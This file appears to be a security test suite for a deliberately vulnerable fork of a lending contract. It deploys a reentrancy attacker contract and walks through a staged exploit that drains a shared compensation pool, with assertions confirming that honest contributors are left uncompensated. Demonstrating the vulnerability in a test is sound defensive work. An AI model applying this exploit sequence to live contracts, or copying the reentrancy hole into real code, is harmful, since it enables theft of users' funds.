
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { viem, networkHelpers, eventsFrom, BTC} from "./helpers.js";
import { parseEther, parseGwei } from "viem";

const ONE_BTC = 100_000_000n;

describe("Reentrancy — draining the compensation pool (faithful vulnerable fork)", () => {
  it("reentrant claimCompensation empties the pool; honest contributors are harmed", async () => {
    const [admin, alice, bob, applicant] = await viem.getWalletClients();
    const pc = await viem.getPublicClient();

    const minFee = parseGwei("0.1") * 50_000n;
    const oracle = await viem.deployContract("BitcoinOracle", [minFee]);
    const service = await viem.deployContract("LendingServiceVulnerable", [oracle.address]);
    const attacker = await viem.deployContract("ReentrancyAttacker", [service.address]);

    await oracle.write.pushBalance([BTC, ONE_BTC]);

    await service.write.deposit({ account: alice.account, value: parseEther("10") });
    await service.write.deposit({ account: bob.account, value: parseEther("10") });
    await attacker.write.depositToPool({ value: parseEther("10") });

    async function makeLoan(amount: bigint, rate: number, duration: bigint) {
      const id = await service.read.nextProposalId();
      await service.write.submitProposal([amount, rate, duration, BTC], { account: applicant.account });
      await service.write.vote([id, true], { account: alice.account });
      await service.write.vote([id, true], { account: bob.account });
      await attacker.write.vote([id, true]);
      await networkHelpers.mine(13);
      const h = await service.write.resolveProposal([id], { account: applicant.account });
      const ev = (await eventsFrom(pc, service.abi, h, "ProposalResolved"))[0].args;
      return { approved: ev.approved as boolean, loan: ev.loanContract as `0x${string}` };
    }

    // 1) primer loan — fully repaid, funds the compensation pool
    const primer = await makeLoan(parseEther("10"), 100, 1000n);
    assert.ok(primer.approved);
    const primerLoan = await viem.getContractAt("Loan", primer.loan);
    await primerLoan.write.repay({ account: applicant.account, value: parseEther("20") });
    const pool = await service.read.compensationPool();
    assert.ok(pool > 0n, "pool funded by primer");

    // 2) BIG loan the attacker stays locked into (never repaid, long duration) —
    //    gives the attacker a large locked/deposited cushion so the per-frame
    //    subtractions during the attack don't underflow.
    const parties: [string, `0x${string}`][] = [
      ["alice", alice.account.address],
      ["bob", bob.account.address],
      ["attacker", attacker.address],
    ];

    const big = await makeLoan(parseEther("15"), 10, 100000n);
    assert.ok(big.approved);

    // 3) victim loan the attacker is also locked into; it fails quickly
    const victim = await makeLoan(parseEther("1.5"), 10, 2n);
    assert.ok(victim.approved);
    const victimLoan = await viem.getContractAt("Loan", victim.loan);
    await networkHelpers.mine(5);
    assert.equal(await victimLoan.read.isFailed(), true);

    const owed = await victimLoan.read.remainingDue([attacker.address]);
    assert.ok(owed > 0n && owed < pool);

    // frames to drain the pool = floor(pool/owed); reentries = frames - 1
    const reentries = pool / owed - 1n;

    const poolBefore = await service.read.compensationPool();

    try {
      await attacker.write.attack([victim.loan, reentries]);
    } catch (e) {
      console.log("ATTACK REVERTED:", (e as Error).message);
    }

    const poolAfter = await service.read.compensationPool();

    // THE EXPLOIT: the shared pool is drained far beyond the attacker's `owed`
    assert.ok(poolBefore - poolAfter > owed, "drained more than the attacker was owed");
    assert.ok(poolAfter < owed, "pool drained below one fair claim (effectively emptied)");

    // HARM: the remaining pool can no longer make an honest co-contributor whole.
    const aliceOwed = await victimLoan.read.remainingDue([alice.account.address]) as bigint;
    assert.ok(aliceOwed > 0n, "honest contributor is still owed on the failed loan");
    assert.ok(poolAfter < aliceOwed, "remaining pool cannot fully compensate the honest contributor");
  });
});
